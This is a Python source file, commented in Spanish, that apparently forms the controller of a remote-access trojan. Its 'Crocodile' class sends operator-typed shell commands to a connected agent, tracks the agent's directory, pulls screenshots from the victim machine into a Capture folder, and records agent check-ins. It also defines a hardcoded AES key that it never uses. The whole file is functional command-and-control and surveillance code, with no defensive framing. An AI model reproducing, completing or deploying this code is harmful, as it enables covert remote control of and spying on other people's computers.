import sys
import os
import asyncio
import base64
import struct
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
sys.path.insert(0, project_root)
from crypto.aes_encryptor import AESEncryptor

class Crocodile:
    def __init__(self):
        key = b"thisis16byteskey"
        self.encryptor = AESEncryptor(key)
        self.sessions = {}

    async def start(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        if not isinstance(reader, asyncio.StreamReader):
            raise TypeError("reader debe ser una instancia de asyncio.StreamReader")
        current_dir = await reader.read(1024)
        count = 0
        while True:
            try: 
                if isinstance(current_dir, bytes):
                    command = await self.get_input(current_dir.decode() + ' #:')
                elif isinstance(current_dir, str):
                    command = await self.get_input(current_dir + ' #:')
                else:
                    raise TypeError("current_dir debe ser de tipo bytes o str")
                if command.lower() == "exit":
                    break
                elif command.startswith("cd"):
                    res = command.encode('utf-8')
                    writer.write(res)
                    resp = await reader.read(1024)
                    current_dir = resp.decode()
                    print(current_dir)
                elif command.startswith("capture"):
                    writer.write(command.encode('utf-8'))
                    try:
                        # Leer header con longitud
                        header = await reader.readexactly(4)
                        data_len = struct.unpack("!I", header)[0]
                        
                        # Leer todos los datos codificados
                        encoded_data = await reader.readexactly(data_len)
                        decoded_data = base64.b64decode(encoded_data)
                        
                        if decoded_data == b"fail":
                            print("Fallo en cliente")
                        else:
                            # Configurar directorio y nombre de archivo
                            capture_dir = "./Capture"
                            os.makedirs(capture_dir, exist_ok=True)  # Crea directorio si no existe
                            
                            # Generar ruta completa CORRECTAMENTE
                            filename = f"monitor-{count}.png"
                            filepath = os.path.join(capture_dir, filename)  # Combina rutas
                            
                            # Guardar archivo en "../Capture/monitor-X.png"
                            with open(filepath, "wb") as f:
                                f.write(decoded_data)
                            
                            count += 1
                            print(f"Captura guardada en: {filepath}")
                            
                            # Enviar confirmación al cliente
                            writer.write(b"CAPTURE_SUCCESS")
                        
                        # Enviar confirmación
                        writer.write(b"OK")
                        await writer.drain()
                        writer.write(b"pwd")
                        resp = await reader.read(1024)
                        current_dir = resp.decode()
                    except Exception as e:
                        writer.write(b"FAIL")
                        await writer.drain()
                else:
                    res= command.encode('utf-8')
                    writer.write(res)
                    resp = await reader.read(1024)
                    current_dir = resp
                    writer.write(b"pwd")
                    resp2 = await reader.read(1024)
                    current_dir = resp2.decode()
                if not resp:
                    print("🔴 El cliente cerró la conexión.")
                    break
                    
                print(resp.decode())
            except Exception as e:
                print("ocurrio un error", e)
                if( str(e).find("El nombre de red especificado ya no está disponible")):
                    break
        
    async def get_input(self,prompt: str):
        return await asyncio.to_thread(input, prompt)

    async def process_check_in(self, data: str) -> tuple:
        """Procesa el check-in de un agente."""
        agent_id, metadata = data.split("|")
        self.sessions[agent_id] = metadata
        return agent_id, "collect_info"
